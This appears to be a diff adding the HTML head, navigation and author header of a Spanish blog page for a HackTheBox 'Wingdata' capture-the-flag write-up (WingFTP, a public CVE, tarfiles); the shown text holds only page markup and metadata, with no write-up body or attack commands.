@@ -1,0 +1,2100 @@
+<!doctype html>
+<html
+  lang="es"
+  dir="ltr"
+  class="scroll-smooth"
+  data-default-appearance="dark"
+  data-auto-appearance="false"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="utf-8">
+  
+    <meta http-equiv="content-language" content="es">
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <meta name="theme-color">
+
+  
+  
+    <title>HackTheBox - Wingdata &middot; blog de cosas etc etc</title>
+    <meta name="title" content="HackTheBox - Wingdata &middot; blog de cosas etc etc">
+  
+
+  
+  
+    <meta name="description" content="OS: Linux | Dificultad: Easy | Conceptos: WingFTP, CVE Público, Tarfiles">
+  
+  
+    <meta name="keywords" content="HTB,Linux,Easy,WingFTP,CVE,Tar,SSH Key,">
+  
+  
+  
+  <link rel="canonical" href="http://localhost:1313/writeups/wingdata/">
+  
+
+  
+  
+    <meta name="author" content="Nicolás Seral">
+  
+  
+    
+      
+        
+          <link href="nseral@proton.me" rel="me">
+        
+      
+    
+      
+        
+          <link href="https://www.linkedin.com/in/nseral/" rel="me">
+        
+      
+    
+      
+        
+          <link href="https://github.com/seraldinho" rel="me">
+        
+      
+    
+      
+        
+          <link href="https://app.hackthebox.com/users/1297012" rel="me">
+        
+      
+    
+  
+
+  
+  <meta property="og:url" content="http://localhost:1313/writeups/wingdata/">
+  <meta property="og:site_name" content="blog de cosas etc etc">
+  <meta property="og:title" content="HackTheBox - Wingdata">
+  <meta property="og:description" content="Resolución de la máquina Wingdata">
+  <meta property="og:locale" content="es">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="writeups">
+    <meta property="article:published_time" content="2026-02-16T00:00:00+00:00">
+    <meta property="article:modified_time" content="2026-02-16T00:00:00+00:00">
+    <meta property="og:image" content="http://localhost:1313/writeups/wingdata/featured.png">
+
+  
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="http://localhost:1313/writeups/wingdata/featured.png">
+  <meta name="twitter:title" content="HackTheBox - Wingdata">
+  <meta name="twitter:description" content="Resolución de la máquina Wingdata">
+
+  
+  
+  
+  
+    
+      
+    
+  
+    
+  
+    
+  
+  
+
+  
+  
+  
+  
+  
+  
+
+  
+
+  
+  
+  
+  
+  
+  
+  
+    
+  
+  
+    
+  
+  
+  <link
+    type="text/css"
+    rel="stylesheet"
+    href="/css/main.bundle.min.d09bb18af68146eed0342c92f68bf35fd2a79c50c19bb31f401339d2da6cf5f5d54309900549dd72ad6261210366bf03cea22f23bbc8fd2695f4ceb69e1bbbe0.css"
+    integrity="sha512-0JuxivaBRu7QNCyS9ovzX9KnnFDBm7MfQBM50tps9fXVQwmQBUndcq1iYSEDZr8DzqIvI7vI/SaV9M62nhu74A==">
+
+  
+  
+  <script
+    type="text/javascript"
+    src="/js/appearance.min.6f41174b3a05b680820fe08cadbfa5fb7a7ca347b76a0955cdc68b9d8aca1ce24f0547e138cea33bcc7904d551a90afcb1cc7f2d9fe8557075d501419046c08c.js"
+    integrity="sha512-b0EXSzoFtoCCD&#43;CMrb&#43;l&#43;3p8o0e3aglVzcaLnYrKHOJPBUfhOM6jO8x5BNVRqQr8scx/LZ/oVXB11QFBkEbAjA=="></script>
+  
+  
+  
+  
+  
+  
+    
+    <script src="/lib/zoom/zoom.min.umd.a527109b68c082a70f3697716dd72a9d5aa8b545cf800cecbbc7399f2ca6f6e0ce3e431f2062b48bbfa47c9ea42822714060bef309be073f49b9c0e30d318d7b.js" integrity="sha512-pScQm2jAgqcPNpdxbdcqnVqotUXPgAzsu8c5nyym9uDOPkMfIGK0i7&#43;kfJ6kKCJxQGC&#43;8wm&#43;Bz9JucDjDTGNew=="></script>
+  
+
+  
+  
+  
+    
+  
+  
+    
+  
+  
+    
+  
+  
+  
+  
+  
+  
+    
+    <script
+      defer
+      type="text/javascript"
+      id="script-bundle"
+      src="/js/main.bundle.min.6b483bdc9246a18b35259ce2a40e363ade34a01edf2f3a31094f0a396844e75f863d18735a89b85ee8301f2dfdb9e471bdf47c44483d4b8f0d6eb93701873824.js"
+      integrity="sha512-a0g73JJGoYs1JZzipA42Ot40oB7fLzoxCU8KOWhE51&#43;GPRhzWom4XugwHy39ueRxvfR8REg9S48Nbrk3AYc4JA=="
+      data-copy="Copiar"
+      data-copied="Copiado"></script>
+  
+
+  
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+    <link rel="manifest" href="/site.webmanifest">
+  
+
+  
+  <script type="application/ld+json">
+  [{
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "articleSection": "Writeups",
+    "name": "HackTheBox - Wingdata",
+    "headline": "HackTheBox - Wingdata",
+    "description": "Resolución de la máquina Wingdata",
+    "inLanguage": "es",
+    "url" : "http://localhost:1313/writeups/wingdata/",
+    "author" : {
+      "@type": "Person",
+      "name": "Nicolás Seral"
+    },
+    "copyrightYear": "2026",
+    "dateCreated": "2026-02-16T00:00:00\u002b00:00",
+    "datePublished": "2026-02-16T00:00:00\u002b00:00",
+    
+    "dateModified": "2026-02-16T00:00:00\u002b00:00",
+    
+    "keywords": ["HTB","Linux","Easy","WingFTP","CVE","Tar","SSH Key"],
+    
+    "mainEntityOfPage": "true",
+    "wordCount": "2389"
+  },
+  {
+    "@context": "https://schema.org",
+    "@type": "BreadcrumbList",
+    "itemListElement": [{
+            "@type": "ListItem",
+            "position":  1 ,
+            "name": "Writeups",
+            "item": "http://localhost:1313/writeups/"
+          },{
+        "@type": "ListItem",
+        "position":  2 ,
+        "name": "HackTheBox - Wingdata",
+        "item": "http://localhost:1313/writeups/wingdata/"
+      }
+    ]
+  }]
+  </script>
+
+
+
+  
+  
+
+  
+  
+
+  
+  
+
+  
+  
+</head>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+    
+  
+
+
+
+
+
+
+  
+  <body class="flex flex-col h-screen m-auto leading-7 max-w-7xl px-6 sm:px-14 md:px-24 lg:px-32 text-lg bg-neutral text-neutral-900 dark:bg-neutral-800 dark:text-neutral bf-scrollbar">
+    <div id="the-top" class="absolute flex self-center">
+      <a
+        class="px-3 py-1 text-sm -translate-y-8 rounded-b-lg bg-primary-200 focus:translate-y-0 dark:bg-neutral-600"
+        href="#main-content">
+        <span class="font-bold text-primary-600 pe-2 dark:text-primary-400">&darr;</span>
+        Ir al contenido
+      </a>
+    </div>
+    
+    
+      <div class="main-menu flex items-center w-full gap-2 p-1 pl-0">
+  
+  
+    <a href="/" class="text-base font-medium truncate min-w-0 shrink">
+      blog de cosas etc etc
+    </a>
+  
+  <div class="flex items-center ms-auto">
+    <div class="hidden md:flex">
+      <nav class="flex items-center gap-x-5 h-12">
+  
+    
+      
+  
+    <a
+      href="/writeups/"
+      
+      class="flex items-center bf-icon-color-hover"
+      aria-label="Writeups"
+      title="Writeups">
+      
+        <span class="mr-1">
+          <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512">
+<path fill="currentColor"  d="M392.8 1.2c-17-4.9-34.7 5-39.6 22l-128 448c-4.9 17 5 34.7 22 39.6s34.7-5 39.6-22l128-448c4.9-17-5-34.7-22-39.6zm80.6 120.1c-12.5 12.5-12.5 32.8 0 45.3L562.7 256l-89.4 89.4c-12.5 12.5-12.5 32.8 0 45.3s32.8 12.5 45.3 0l112-112c12.5-12.5 12.5-32.8 0-45.3l-112-112c-12.5-12.5-32.8-12.5-45.3 0zm-306.7 0c-12.5-12.5-32.8-12.5-45.3 0l-112 112c-12.5 12.5-12.5 32.8 0 45.3l112 112c12.5 12.5 32.8 12.5 45.3 0s12.5-32.8 0-45.3L77.3 256l89.4-89.4c12.5-12.5 12.5-32.8 0-45.3z"/></svg></span>
+        </span>
+      
+      
+        <span class="text-base font-medium break-normal">
+          Writeups
+        </span>
+      
+    </a>
+  
+
+    
+      
+  
+    <div class="nested-menu">
+      <div class="cursor-pointer flex items-center">
+        <a
+          
+            href="/notas/"
+            
+          
+          aria-label="Notas"
+          class="flex items-center text-base font-medium bf-icon-color-hover"
+          title="Notas">
+          
+            <span class="mr-1">
+              <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M421.7 220.3L188.5 453.4L154.6 419.5L158.1 416H112C103.2 416 96 408.8 96 400V353.9L92.51 357.4C87.78 362.2 84.31 368 82.42 374.4L59.44 452.6L137.6 429.6C143.1 427.7 149.8 424.2 154.6 419.5L188.5 453.4C178.1 463.8 165.2 471.5 151.1 475.6L30.77 511C22.35 513.5 13.24 511.2 7.03 504.1C.8198 498.8-1.502 489.7 .976 481.2L36.37 360.9C40.53 346.8 48.16 333.9 58.57 323.5L291.7 90.34L421.7 220.3zM492.7 58.75C517.7 83.74 517.7 124.3 492.7 149.3L444.3 197.7L314.3 67.72L362.7 19.32C387.7-5.678 428.3-5.678 453.3 19.32L492.7 58.75z"/></svg>
+</span>
+            </span>
+          
+          <span class="text-bg font-bg break-normal" title="Notas">
+            Notas
+          </span>
+          <span>
+            <span class="relative block icon"><svg
+  xmlns="http://www.w3.org/2000/svg"
+  viewBox="0 0 20 20"
+  fill="currentColor"
+  aria-hidden="true"
+>
+  <path
+    fill-rule="evenodd"
+    d="M5.23 7.21a.75.75 0 011.06.02L10 11.168l3.71-3.938a.75.75 0 111.08 1.04l-4.25 4.5a.75.75 0 01-1.08 0l-4.25-4.5a.75.75 0 01.02-1.06z"
+    clip-rule="evenodd"
+  />
+</svg>
+</span>
+          </span>
+        </a>
+      </div>
+      <div class="menuhide">
+        <div class="pt-2 p-5 mt-2 rounded-xl backdrop-blur shadow-2xl bg-neutral/25 dark:bg-neutral-800/25">
+          <div class="flex flex-col space-y-3">
+            
+              <a
+                href="/notas/protocolos/"
+                
+                aria-label="Protocolos"
+                class="flex items-center bf-icon-color-hover">
+                
+                <span class="text-sm font-sm" title="Protocolos">
+                  Protocolos
+                </span>
+              </a>
+            
+              <a
+                href="/notas/tecnicas/"
+                
+                aria-label="Técnicas"
+                class="flex items-center bf-icon-color-hover">
+                
+                <span class="text-sm font-sm" title="Técnicas">
+                  Técnicas
+                </span>
+              </a>
+            
+          </div>
+        </div>
+      </div>
+    </div>
+  
+
+    
+  
+
+  
+
+  
+
+  
+    <button
+      id="search-button"
+      aria-label="Search"
+      class="text-base bf-icon-color-hover"
+      title="Buscar (/)">
+      <span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+</span>
+    </button>
+  
+
+  
+</nav>
+
+
+
+    </div>
+    <div class="flex md:hidden">
+      <div class="flex items-center h-14 gap-4">
+  
+    <button
+      id="search-button-mobile"
+      aria-label="Search"
+      class="flex items-center justify-center bf-icon-color-hover"
+      title="Buscar (/)">
+      <span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+</span>
+    </button>
+  
+
+  
+
+  
+    <input type="checkbox" id="mobile-menu-toggle" autocomplete="off" class="hidden peer">
+    <label for="mobile-menu-toggle" class="flex items-center justify-center cursor-pointer bf-icon-color-hover">
+      <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M0 96C0 78.33 14.33 64 32 64H416C433.7 64 448 78.33 448 96C448 113.7 433.7 128 416 128H32C14.33 128 0 113.7 0 96zM0 256C0 238.3 14.33 224 32 224H416C433.7 224 448 238.3 448 256C448 273.7 433.7 288 416 288H32C14.33 288 0 273.7 0 256zM416 448H32C14.33 448 0 433.7 0 416C0 398.3 14.33 384 32 384H416C433.7 384 448 398.3 448 416C448 433.7 433.7 448 416 448z"/></svg>
+</span>
+    </label>
+
+    <div
+      role="dialog"
+      aria-modal="true"
+      style="scrollbar-gutter: stable;"
+      class="fixed inset-0 z-50 invisible overflow-y-auto px-6 py-20 opacity-0 transition-[opacity,visibility] duration-300 peer-checked:visible peer-checked:opacity-100 bg-neutral-50/97 dark:bg-neutral-900/99
+      bf-scrollbar">
+      <label
+        for="mobile-menu-toggle"
+        class="fixed end-8 top-5 flex items-center justify-center z-50 h-12 w-12 cursor-pointer select-none rounded-full bf-icon-color-hover border bf-border-color bf-border-color-hover bg-neutral-50 dark:bg-neutral-900">
+        <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>
+</span>
+      </label>
+      <nav class="mx-auto max-w-md space-y-6">
+        
+  
+    
+    <div class="px-2">
+      <a
+        href="/writeups/"
+        aria-label="Writeups"
+        
+        class="flex items-center gap-4 group bf-icon-color-hover text-neutral-700 dark:text-neutral-200">
+        
+          <span class="flex items-center justify-center h-8 w-8 text-2xl">
+            <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512">
+<path fill="currentColor"  d="M392.8 1.2c-17-4.9-34.7 5-39.6 22l-128 448c-4.9 17 5 34.7 22 39.6s34.7-5 39.6-22l128-448c4.9-17-5-34.7-22-39.6zm80.6 120.1c-12.5 12.5-12.5 32.8 0 45.3L562.7 256l-89.4 89.4c-12.5 12.5-12.5 32.8 0 45.3s32.8 12.5 45.3 0l112-112c12.5-12.5 12.5-32.8 0-45.3l-112-112c-12.5-12.5-32.8-12.5-45.3 0zm-306.7 0c-12.5-12.5-32.8-12.5-45.3 0l-112 112c-12.5 12.5-12.5 32.8 0 45.3l112 112c12.5 12.5 32.8 12.5 45.3 0s12.5-32.8 0-45.3L77.3 256l89.4-89.4c12.5-12.5 12.5-32.8 0-45.3z"/></svg></span>
+          </span>
+        
+        <span title="Writeups" class="text-2xl font-bold tracking-tight">
+          Writeups
+        </span>
+        
+      </a>
+
+      
+    </div>
+  
+    
+    <div class="px-2">
+      <a
+        href="/notas/"
+        aria-label="Notas"
+        
+        class="flex items-center gap-4 group bf-icon-color-hover text-neutral-700 dark:text-neutral-200">
+        
+          <span class="flex items-center justify-center h-8 w-8 text-2xl">
+            <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M421.7 220.3L188.5 453.4L154.6 419.5L158.1 416H112C103.2 416 96 408.8 96 400V353.9L92.51 357.4C87.78 362.2 84.31 368 82.42 374.4L59.44 452.6L137.6 429.6C143.1 427.7 149.8 424.2 154.6 419.5L188.5 453.4C178.1 463.8 165.2 471.5 151.1 475.6L30.77 511C22.35 513.5 13.24 511.2 7.03 504.1C.8198 498.8-1.502 489.7 .976 481.2L36.37 360.9C40.53 346.8 48.16 333.9 58.57 323.5L291.7 90.34L421.7 220.3zM492.7 58.75C517.7 83.74 517.7 124.3 492.7 149.3L444.3 197.7L314.3 67.72L362.7 19.32C387.7-5.678 428.3-5.678 453.3 19.32L492.7 58.75z"/></svg>
+</span>
+          </span>
+        
+        <span title="Notas" class="text-2xl font-bold tracking-tight">
+          Notas
+        </span>
+        
+          <label
+            for="fullscreen-submenu-notas"
+            class="ms-auto flex items-center justify-center h-10 w-10 cursor-pointer rounded-lg bf-icon-color-hover border bf-border-color bf-border-color-hover">
+            <span class="relative block icon"><svg
+  xmlns="http://www.w3.org/2000/svg"
+  viewBox="0 0 20 20"
+  fill="currentColor"
+  aria-hidden="true"
+>
+  <path
+    fill-rule="evenodd"
+    d="M5.23 7.21a.75.75 0 011.06.02L10 11.168l3.71-3.938a.75.75 0 111.08 1.04l-4.25 4.5a.75.75 0 01-1.08 0l-4.25-4.5a.75.75 0 01.02-1.06z"
+    clip-rule="evenodd"
+  />
+</svg>
+</span>
+          </label>
+        
+      </a>
+
+      
+        <input checked type="checkbox" id="fullscreen-submenu-notas" autocomplete="off" class="hidden peer/full">
+
+        <div
+          class="grid grid-rows-[0fr] transition-[grid-template-rows] duration-300 peer-checked/full:grid-rows-[1fr]">
+          <div class="overflow-hidden">
+            <div class="ms-7 mt-4">
+              
+                <a
+                  href="/notas/protocolos/"
+                  aria-label="Protocolos"
+                  
+                  class="flex items-center gap-3 p-2 group bf-icon-color-hover text-neutral-700 dark:text-neutral-200">
+                  
+                  <span title="Protocolos" class="text-lg">
+                    Protocolos
+                  </span>
+                </a>
+              
+                <a
+                  href="/notas/tecnicas/"
+                  aria-label="Técnicas"
+                  
+                  class="flex items-center gap-3 p-2 group bf-icon-color-hover text-neutral-700 dark:text-neutral-200">
+                  
+                  <span title="Técnicas" class="text-lg">
+                    Técnicas
+                  </span>
+                </a>
+              
+            </div>
+          </div>
+        </div>
+      
+    </div>
+  
+
+        
+  
+
+        
+  
+
+      </nav>
+    </div>
+  
+</div>
+
+
+
+
+
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+    
+    <div class="relative flex flex-col grow">
+      <main id="main-content" class="grow">
+        
+  
+  <article>
+    
+    
+      
+      
+      
+      
+        
+
+
+
+
+
+
+
+  
+  
+    
+  
+    
+  
+    
+  
+    
+  
+
+
+
+
+
+
+  
+    
+    
+      
+      
+    
+  
+
+
+
+
+
+    <div id="hero" class="h-[150px] md:h-[200px]"></div>
+  
+  <div class="fixed inset-x-0 top-0 h-[800px] single_hero_background nozoom">
+    
+    
+    
+    <img
+      id="background-image"
+      src="/writeups/wingdata/featured_hu_3db3e490442fd691.png"
+      role="presentation"
+      loading="eager"
+      decoding="async"
+      fetchpriority="high"
+      class="absolute inset-0 w-full h-full object-cover"
+      >
+    <div
+      class="absolute inset-0 bg-gradient-to-t from-neutral dark:from-neutral-800 to-transparent mix-blend-normal"></div>
+    <div
+      class="absolute inset-0 opacity-60 bg-gradient-to-t from-neutral dark:from-neutral-800 to-neutral-100 dark:to-neutral-800 mix-blend-normal"></div>
+  </div>
+
+  
+    <div
+      id="background-blur"
+      class="fixed opacity-0 inset-x-0 top-0 h-full single_hero_background nozoom backdrop-blur-xl bg-neutral-100/75 dark:bg-neutral-800/60"></div>
+    
+    
+    <script
+      type="text/javascript"
+      src="/js/background-blur.min.605b3b942818f0ab5a717ae446135ec46b8ee5a2ad12ae56fb90dc2a76ce30c388f9fec8bcc18db15bd47e3fa8a09d779fa12aa9c184cf614a315bc72c6c163d.js"
+      integrity="sha512-YFs7lCgY8KtacXrkRhNexGuO5aKtEq5W&#43;5DcKnbOMMOI&#43;f7IvMGNsVvUfj&#43;ooJ13n6EqqcGEz2FKMVvHLGwWPQ=="
+      data-blur-id="background-blur"
+      data-image-id="background-image"
+      data-image-url="/writeups/wingdata/featured_hu_3db3e490442fd691.png"></script>
+  
+      
+    
+
+    
+    <header id="single_header" class="mt-5 max-w-prose">
+      
+        <ol class="text-sm text-neutral-500 dark:text-neutral-400 print:hidden">
+  
+  
+    
+  
+    
+  
+  <li class="hidden">
+    <a class="hover:underline decoration-neutral-300 dark:underline-neutral-600" href="/"
+      >Nicolás Seral</a
+    ><span class="px-1 text-primary-500">/</span>
+  </li>
+
+  
+  <li class="inline">
+    <a class="hover:underline decoration-neutral-300 dark:underline-neutral-600" href="/writeups/"
+      >Writeups</a
+    ><span class="px-1 text-primary-500">/</span>
+  </li>
+
+  
+  <li class="hidden">
+    <a class="hover:underline decoration-neutral-300 dark:underline-neutral-600" href="/writeups/wingdata/"
+      >HackTheBox - Wingdata</a
+    ><span class="px-1 text-primary-500">/</span>
+  </li>
+
+</ol>
+
+
+      
+      <h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
+        HackTheBox - Wingdata
+      </h1>
+      <div class="mt-1 mb-6 text-base text-neutral-500 dark:text-neutral-400 print:hidden">
+        
+
+
+
+
+
+  
+  
+
+
+
+  
+
+  
+  
+  
+    
+  
+
+  
+
+  
+    
+  
+
+  
+
+  
+
+  
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  <div class="flex flex-row flex-wrap items-center">
+    
+    
+      <time datetime="2026-02-16T00:00:00&#43;00:00">16 de febrero de 2026</time><span class="px-2 text-primary-500">&middot;</span><span title="Tiempo de lectura">12 mins</span>
+    
+
+    
+    
+  </div>
+
+  
+
+  
+  
+
+  
+  
+
+
+
+      </div>
+      
+        
+  
+  
+  
+  
+  
+  
+
+  
+
+  
+    
+    
+<div class="flex author">
+  
+    
+    
+      
+    
+    
+      
+      
+      
+        
+        
+        
+      
+      <img
+        class="!mt-0 !mb-0 h-24 w-24 rounded-full me-4"
+        width="96"
+        height="96"
+        alt="Nicolás Seral"
+        src="/img/pinguino3_hu_fd56ac1f77425976.png"
+        data-zoom-src="/img/pinguino3_hu_7423f79bed0f83d4.png">
+    
+  
+  <div class="place-self-center">
+    
+      <div class="text-[0.6rem] uppercase leading-3 text-neutral-500 dark:text-neutral-400">
+        Autor
+      </div>
+      <div class="font-semibold leading-6 text-neutral-800 dark:text-neutral-300">
+        Nicolás Seral
+      </div>
+    
+    
+      <div class="text-sm text-neutral-700 dark:text-neutral-400">bla bla bla bla</div>
+    
+    <div class="text-2xl sm:text-lg">
+  <div class="flex flex-wrap text-neutral-400 dark:text-neutral-500 space-x-2">
+    
+      
+        
+        <a
+          class="email-link hover:text-primary-700 dark:hover:text-primary-400"
+          href="#"
+          
+            data-email="bnNlcmFsQHByb3Rvbi5tZQ=="
+          
+          target="_blank"
+          aria-label="Email"
+          title="Email"
+          rel="me noopener noreferrer"
+          ><span class="inline-block align-text-bottom"><span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M207.8 20.73c-93.45 18.32-168.7 93.66-187 187.1c-27.64 140.9 68.65 266.2 199.1 285.1c19.01 2.888 36.17-12.26 36.17-31.49l.0001-.6631c0-15.74-11.44-28.88-26.84-31.24c-84.35-12.98-149.2-86.13-149.2-174.2c0-102.9 88.61-185.5 193.4-175.4c91.54 8.869 158.6 91.25 158.6 183.2l0 16.16c0 22.09-17.94 40.05-40 40.05s-40.01-17.96-40.01-40.05v-120.1c0-8.847-7.161-16.02-16.01-16.02l-31.98 .0036c-7.299 0-13.2 4.992-15.12 11.68c-24.85-12.15-54.24-16.38-86.06-5.106c-38.75 13.73-68.12 48.91-73.72 89.64c-9.483 69.01 43.81 128 110.9 128c26.44 0 50.43-9.544 69.59-24.88c24 31.3 65.23 48.69 109.4 37.49C465.2 369.3 496 324.1 495.1 277.2V256.3C495.1 107.1 361.2-9.332 207.8 20.73zM239.1 304.3c-26.47 0-48-21.56-48-48.05s21.53-48.05 48-48.05s48 21.56 48 48.05S266.5 304.3 239.1 304.3z"/></svg>
+</span></span></a
+        >
+      
+    
+      
+        
+        <a
+          class=" hover:text-primary-700 dark:hover:text-primary-400"
+          href="https://www.linkedin.com/in/nseral/"
+          
+          target="_blank"
+          aria-label="Linkedin"
+          title="Linkedin"
+          rel="me noopener noreferrer"
+          ><span class="inline-block align-text-bottom"><span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5 0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9V416z"/></svg>
+</span></span></a
+        >
+      
+    
+      
+        
+        <a
+          class=" hover:text-primary-700 dark:hover:text-primary-400"
+          href="https://github.com/seraldinho"
+          
+          target="_blank"
+          aria-label="Github"
+          title="Github"
+          rel="me noopener noreferrer"
+          ><span class="inline-block align-text-bottom"><span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
+</span></span></a
+        >
+      
+    
+      
+        
+        <a
+          class=" hover:text-primary-700 dark:hover:text-primary-400"
+          href="https://app.hackthebox.com/users/1297012"
+          
+          target="_blank"
+          aria-label="Hackthebox"
+          title="Hackthebox"
+          rel="me noopener noreferrer"
+          ><span class="inline-block align-text-bottom"><span class="relative block icon"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+  <path d="M4 15.8294V15.75V8C4 7.69114 4.16659 7.40629 4.43579 7.25487L11.6182 3.21475L11.6727 3.18411C11.8759 3.06979 12.1241 3.06979 12.3273 3.18411L19.6105 7.28092C19.8511 7.41625 20 7.67083 20 7.94687V15.75V15.8294C20 16.1119 19.8506 16.3733 19.6073 16.5167L12.379 20.7766C12.1451 20.9144 11.8549 20.9144 11.621 20.7766L4.39267 16.5167C4.14935 16.3733 4 16.1119 4 15.8294Z" stroke="currentColor" stroke-width="2.6" stroke-linecap="round" stroke-linejoin="round"/>
+  <path d="M12 21V12" stroke="currentColor" stroke-width="2.6" stroke-linecap="round"/>
+  <path d="M12 12L4 7.5" stroke="currentColor" stroke-width="2.6" stroke-linecap="round"/>
+  <path d="M20 7.5L12 12" stroke="currentColor" stroke-width="2.6" stroke-linecap="round"/>
+</svg>
+</span></span></a
+        >
+      
+    
+  </div>
+
+</div>
